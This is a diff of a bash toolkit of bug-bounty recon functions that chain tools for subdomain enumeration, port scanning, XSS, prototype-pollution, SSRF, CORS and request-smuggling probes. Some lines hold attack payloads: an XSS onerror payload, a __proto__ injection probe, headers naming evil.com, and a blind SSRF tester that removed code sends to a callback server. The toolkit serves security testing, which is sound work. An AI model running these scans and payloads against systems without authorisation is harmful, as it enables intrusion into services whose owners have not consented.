@@ -70,13 +70,6 @@ ipinfo() {
   curl http://ipinfo.io/$1
 }
 
-# Use the output of this to make .scope files for checkscope
-getscope() {
-  mkdir scope
-  rescope --burp -u $1 -o scope/burpscope.json
-  rescope --zap --name inscope -u $1 -o scope/zapscope.context
-}
-
 # Valida a lista de resolvedores
 getfreshresolvers() {
   dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -o ~/tools/lists/my-lists/resolvers
@@ -299,14 +292,6 @@ textinjection() {
     [ -s "textinjection.txt" ] && echo "text injection found" | notify -silent
     [ -s "textinjection.txt" ] && cat textinjection.txt | notify -silent
 }
-getaliveAxiom() {
-  # sperate http and https compare if http doest have or redirect to https put in seperate file
-  # compare if you go to https if it automaticly redirects to https if not when does it in the page if never
-  echo "[+] Check live hosts"
-  axiom-scan clean.subdomains -m httpx -silent -status-code -mc 200,401,403 -o HTTPOK -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888
-  cat HTTPOK | grep 200 | awk -F " " '{print $1}' | anew 200HTTP
-  cat HTTPOK | grep -E '40[0-4]' | grep -Ev 404 | awk -F " " '{print $1}' | anew 403HTTP
-}
 getdata() {
   echo "[+] Get all responses and save on roots folder"
   cat ALLHTTP | fff -d 50 -S -o AllHttpData
@@ -358,19 +343,13 @@ prototypefuzz() {
   echo "Prototype FUZZ" | notify -silent -id subs
   cat ALLHTTP | sed 's/$/\/?__proto__[testparam]=exploit\//' | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE" | grep -v "NOT" | notify -silent
 }
+
 subtakeover() {
   echo "test for posible subdomain-takeover"
   python3 $ToolsPath/takeover/takeover.py -l clean.subdomains -o subtakeover.txt -k -v -t 50
   [ -s "subtakeover.txt" ] && cat subtakeover.txt | notify -silent -id subs
 }
 
-gitexposed() {
-  echo "Probe gitexposed"
-  echo "Init gitexposed probe" | notify -silent -id subs
-  [ -s "ALLHTTP" ] && cat ALLHTTP | unfurl domains | anew -q gitexpprobe
-  [ -s "gitexpprobe" ] && python3 $ToolsPath/GitTools/Finder/gitfinder.py -i gitexpprobe -o gitexpresult
-  [ -s "gitexpresult" ] && cat gitexpresult | notify -silent -id subs
-}
 ##########################################################
 # use massdns
 # use dns history to check for possible domain takeover
@@ -394,29 +373,6 @@ screenshot() {
   cat ALLHTTP | aquatone -chrome-path /snap/bin/chromium -scan-timeout 900 -http-timeout 6000 -out aqua_out -ports xlarge
 }
 
-scanner() {
-  # do udp scan as well
-  # can't decide weither to put -p0-65535 or --top-ports 1000
-  sudo ~/tools/masscan/bin/masscan -p0-65535 --open --rate 100000 --wait 0 -iL ipv4.ipaddresses -oX masscan.xml --exclude 255.255.255.255
-  sudo rm paused.conf
-  open_ports=$(cat masscan.xml | grep portid | cut -d "\"" -f 10 | sort -n | uniq | paste -sd,)
-  cat masscan.xml | grep portid | cut -d "\"" -f 4 | sort -V | uniq >>nmap_targets.tmp
-
-  sudo nmap -sVC -p $open_ports -v -Pn -n -T4 -iL nmap_targets.tmp -oX nmap.ipv4.xml
-  sudo rm nmap_targets.tmp
-  xsltproc -o nmap-native.ipv4.html nmap.ipv4.xml
-  #  xsltproc -o nmap-bootstrap.ipv4.html bootstrap-nmap.xsl nmap.ipv4.xml
-
-  [ -f ipv6.ipaddresses ] && sudo nmap -sSV --top-ports 1000 -Pn -n -iL ipv6.ipaddresses -oX nmap.ipv6.xml &&
-    xsltproc -o nmap-native.ipv6.html nmap.ipv6.xml
-}
-
-getrobots() {
-  cat hosts | while read line; do
-    python3 ~/tools/waybackrobots.py $line
-  done
-  cat *-robots.txt | cut -c -2 | sort -u >>wayback-data/robots.paths.wobs
-}
 
 crawler() {
   echo 'Crawler in action :)'
@@ -452,6 +408,7 @@ xsshunter() {
   [ -s "filtered_urls.txt" ] && cat filtered_urls.txt | qsreplace '"><img src=x onerror=alert(document.domain);>' | freq | egrep -v 'Not' | anew FreqXSS.txt
   [ -s "FreqXSS.txt" ] && cat FreqXSS.txt | notify -silent -id xss
 }
+
 bypass4xx() {
   [ -s "403HTTP" ] && cat 403HTTP | dirdar -only-ok | anew dirdarResult.txt
   [ -s "dirdarResult.txt" ] && cat dirdarResult.txt | sed -e '1,12d' | sed '/^$/d' | anew 4xxbypass.txt | notify -silent -id subs
@@ -462,6 +419,7 @@ paramspider() {
   cat output/http:/*.txt | anew params
   cat output/https:/*.txt | anew params
 }
+
 xssknox(){
   [ -s "waybackdata" ] && cat waybackdata | uro | kxss | awk '{print $9}' | anew kxssresult
   [ -s "kxssresult" ] && python3 $HOME/Tools/knoxnl/knoxnl.py -i kxssresult -s -o xssSuccess
@@ -502,6 +460,7 @@ nucauto() {
   cat ALLHTTP | nuclei -etags redirect,xss,ssrf,graphql,swagger -severity critical,high,medium,low -o resultNuclei 
   [ -s "resultNuclei" ] && cat resultNuclei | notify -silent -id nuclei
 }
+
 faviconEnum(){
   echo '[+] Enumerate FavFreak'
   cat 200HTTP | python3 /root/Tools/FavFreak/favfreak.py --shodan -o outputFavFreak
@@ -522,18 +481,6 @@ getjsdata() {
   [ -s "jsinfo" ] && cat jsinfo | notify -silent -id nuclei
 }
 
-getjspaths() {
-  cat alive.js.urls | while read line; do
-    ruby $HOME/tools/relative-url-extractor/extract.rb $line | tee -a js.extracted.paths
-    python3 ~/tools/LinkFinder/linkfinder.py -i $line -o cli | tee -a js.extracted.paths
-  done
-
-  cat hosts | hakrawler -linkfinder | tee -a js.extracted.paths
-  sort -u js.extracted.paths -o sorted.js.paths
-  rm -f js.extracted.paths
-  cat sorted.js.paths | cut -c 2- | sort -u >>sorted.js.paths.wobs
-}
-
 secretfinder() {
   echo '[+] Run secretfinder'
   regexs=$(curl -s 'https://gist.githubusercontent.com/mswell/1070fae0021b08d5e5650743ea402b4b/raw/589e669dec183009f01eca2c2ef1401b5f77af2b/regexJS' | tr '\n' '|')
@@ -541,105 +488,11 @@ secretfinder() {
   cat js_secrets_result | grep -v custom_regex | grep -iv '[URL]:' | anew JSPathNoUrl
   cat JSPathNoUrl | python3 /root/Tools/BBTz/collector.py JSOutput
 }
-jsep() {
-  mkdir scripts
-  mkdir scriptsresponse
-  mkdir endpoints
-  mkdir responsebody
-  mkdir headers
-  response() {
-    echo "Gathering Response"
-    for x in $(cat hosts); do
-      NAME=$(echo $x | awk -F/ '{print $3}')
-      curl -X GET -H "X-Forwarded-For: evil.com" $x -I >"headers/$NAME"
-      curl -s -X GET -H "X-Forwarded-For: evil.com" -L $x >"responsebody/$NAME"
-    done
-  }
-
-  jsfinder() {
-    echo "Gathering JS Files"
-    for x in $(ls "responsebody"); do
-      printf "\n\n${RED}$x${NC}\n\n"
-      END_POINTS=$(cat "responsebody/$x" | grep -Eoi "src=\"[^>]+></script>" | cut -d '"' -f 2)
-      for end_point in $END_POINTS; do
-        len=$(echo $end_point | grep "http" | wc -c)
-        mkdir "scriptsresponse/$x/" >/dev/null 2>&1
-        URL=$end_point
-        if [ $len == 0 ]; then
-          URL="https://$x$end_point"
-        fi
-        file=$(basename $end_point)
-        curl -X GET $URL -L >"scriptsresponse/$x/$file"
-        echo $URL >>"scripts/$x"
-      done
-    done
-  }
-
-  endpoints() {
-    echo "Gathering Endpoints"
-    for domain in $(ls scriptsresponse); do
-      #looping through files in each domain
-      mkdir endpoints/$domain
-      for file in $(ls scriptsresponse/$domain); do
-        ruby ~/tools/relative-url-extractor/extract.rb scriptsresponse/$domain/$file >>endpoints/$domain/$file
-      done
-    done
-  }
-  response
-  jsfinder
-  endpoints
-
-  cat endpoints/*/* | sort -u | tee -a endpoints.txt
-}
-#getcms(){
-#  cmsmap webanalyzer cmseek builtwith whatweb wappalyze
-#}
-
-#check4wafs(){
-#  wafwoof
-#  identYwaf
-#}
-
-## ffuf, gobuster, meg
-#bf-jspaths
-#bf-wayback
-#bf-quick
-#bf-mylist
-#bf-custom
-
-#bf-params(){
-# arjun parameth aron photon
-#}
-
-fullreconAxiom() {
-  echo "[+] START RECON AT $(cat domain)" | notify -silent
-  subdomainenum
-  getaliveAxiom
-  getdata
-  dnsrecords
-  bypass4xx
-  Corstest
-  crawler
-  getjsurls
-  getjsdata
-  paramspider
-  screenshot
-  nucauto
-  echo "[+] END RECON AT $(cat domain)" | notify -silent
-}
 
 fullrecon() {
   echo "[+] START RECON AT $(cat domain)" | notify -silent -id tel
-  #  getscope
-  # rapid7search
   subdomainenum
-  #subdomain-brute
-  #resolving
-  # checkscope
   getalive
-  # geojson
-  # nginxpath
-  # textinjection
   getdata
   screenshot
   dnsrecords
@@ -654,7 +507,6 @@ fullrecon() {
   crawler
   xsshunter
   faviconEnum
-  #Corstest
   getjsurls
   getjsdata
   secretfinder
@@ -664,32 +516,9 @@ fullrecon() {
   #  smuggling
   #  getjspaths
   #  nuc
-  #  getcms
-  #  check4wafs
-  #  bruteforce
   echo "[+] END RECON AT $(cat domain)" | notify -silent -id tel
 }
 
-redUrl() {
-  gau -subs $1 | grep "redirect" >>$1_redirectall.txt | gau -subs $1 | grep "redirect=" >>$1_redirectequal.txt | gau -subs $1 | grep "url" >>$1_urlall.txt | gau -subs $1 | grep "url=" >>$1_urlequal.txt | gau -subs $1 | grep "next=" >>$1_next.txt | gau -subs $1 | grep "dest=" >>$1_dest.txt | gau -subs $1 | grep "destination" >>$1_destination.txt | gau -subs $1 | grep "return" >>$1_return.txt | gau -subs $1 | grep "go=" >>$1_go.txt | gau -subs $1 | grep "redirect_uri" >>$1_redirecturi.txt | gau -subs $1 | grep "continue=" >>$1_continue.txt | gau -subs $1 | grep "return_path=" >>$1_path.txt | gau -subs $1 | grep "externalLink=" >>$1_link.txt | gau -subs $1 | grep "URL=" >>$1_URL.txt
-}
-
-blindssrftest() {
-  if [ -z "$1" ]; then
-    echo >&2 "ERROR: Domain not set"
-    exit 2
-  fi
-  if [ -z "$2" ]; then
-    echo >&2 "ERROR: Sever link not set"
-    exit 2
-  fi
-  if [ -f wayback-data/waybackurls ] && [ -f crawler.urls ]; then
-    cat wayack-data/waybackurls crawler.urls | sort -u | grep "?" | qsreplace -a | qsreplace $2 >$1-bssrf
-    sed -i "s|$|\&dest=$2\&redirect=$2\&uri=$2\&path=$2\&continue=$2\&url=$2\&window=$2\&next=$2\&data=$2\&reference=$2\&site=$2\&html=$2\&val=$2\&validate=$2\&domain=$2\&callback=$2\&return=$2\&page=$2\&feed=$2\&host=$2&\port=$2\&to=$2\&out=$2\&view=$2\&dir=$2\&show=$2\&navigation=$2\&open=$2|g" $1-bssrf
-    echo "Firing the requests - check your server for potential callbacks"
-    ffuf -w $1-bssrf -u FUZZ -t 50
-  fi
-}
 Corstest() {
   gf cors roots | awk -F '/' '{print $2}' | anew | httpx -silent -o CORSHTTP
   [ -s "CORSHTTP" ] && python3 /root/Tools/CORStest/corstest.py CORSHTTP -q | notify -silent
@@ -699,28 +528,6 @@ smuggling() {
   cat hosts | rush -j 3 "python3 $ToolsPath/smuggler/smuggler.py -u {}" | tee -a smuggler_op.txt
 }
 
-nuc() {
-  mkdir nuclei_op
-
-  nuclei -l hosts cves/ -c 60 -pbar -o nuclei_op/cves.txt
-  nuclei -l hosts dns/ -c 60 -pbar -o nuclei_op/dns.txt
-  nuclei -l hosts subdomain-takeover/ -c 60 -pbar -o nuclei_op/subdomain-takeover.txt
-  nuclei -l hosts files/ -c 60 -pbar -o nuclei_op/files.txt
-  nuclei -l hosts panels/ -c 60 -pbar -o nuclei_op/panels.txt
-  nuclei -l hosts security-misconfiguration/ -c 60 -pbar -o nuclei_op/security-misconfiguration.txt
-  nuclei -l hosts tokens/ -c 60 -pbar -o nuclei_op/tokens.txt
-  nuclei -l hosts vulnerabilities/ -c 60 -pbar -o nuclei_op/vulnerabilities.txt
-  nuclei -l hosts default-credentials/ -c 60 -pbar -o nuclei_op/default-credentials.txt
-}
-
-nucaxiom() {
-  axiom-scan 200HTTP -m nuclei -t /root/nuclei-templates -severity critical,high,medium,low -o resultNuclei
-  [ -s resultNuclei ] && cat resultNuclei | notify -silent
-}
-nucautoMedium() {
-  nuclei -ut
-  cat 200HTTP | nuclei -c 60 -t /root/nuclei-templates/ -severity medium,low | notify -silent
-}
 ## must already be login to github
 # this is part of jhaddix hunter.sh script
 github_dorks() {
@@ -863,23 +670,6 @@ github_dorks() {
   echo ""
 }
 
-check4vulns() {
-  redUrl
-  blindssrf
-  #  github-dorker -> gitrob, git-dump, git-hound, git-all-secrets
-  #  google-dorker -> thehavester, jnx-script
-  #  shodan-dorker -> reconSai
-  #  CORStest -> CORStest
-  #  AWSbuckets ScoutSuite -> S3canner, lazyS3, mass3, s3Takeover
-  #  domain-takeover -> subzy, subzero, tko-subs, takeover, subjack
-  #  XSS -> XSStrike
-  #  backupfiles -> BFAC
-  #  crlf -> CRLF-Injection-Scanner
-}
-
-#getapk(){ adb }
-#pushapk(){ adb }
-
 dapk() {
   apktool d $1
 }
@@ -893,26 +683,6 @@ dapk() {
 # add ssl cert to an app automaticly
 # decodify reverseAPK websf ninjadroid
 #}
-
-# OSINT tools
-check4phNsq() {
-  ~/tools/urlcrazy/urlcrazy -p $1
-  #python3 ~/tools/dnstwist/dnstwist.py
-}
-
-fullOSINT() {
-  check4phNsq
-  #  spiderfoot
-  #  hunter.io
-  #  intelx.io
-  #  Zoomeye
-  #  nerdydata
-  #  crunchbase
-  #  curl emailrep.io/$email
-  #  OSRF
-  #  theharvester
-  #  recon-ng-v5
-}
 
 # reference for scripts
 # https://github.com/venom26/recon
@@ -956,6 +726,7 @@ fleetScan() {
   echo 'Remove servers ...'
   axiom-rm "well0*" -f
 }
+
 discoverLive() {
   echo 'scan network' $1
   sudo nmap -v -sn $1 -oG liveHosts
